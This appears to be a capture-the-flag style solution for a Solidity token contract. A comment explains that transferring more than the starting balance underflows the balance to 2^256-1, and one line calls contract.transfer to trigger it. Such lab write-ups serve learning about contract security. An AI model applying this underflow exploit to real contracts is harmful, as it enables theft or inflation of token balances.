/**
 * The goal is to set an amount that is greater than our starting balance, so there is an underflow.
 * In solidity, when there is an underflow, the value wraps around, and becomes the max value (2^256-1).
 */

await contract.transfer(player, 21);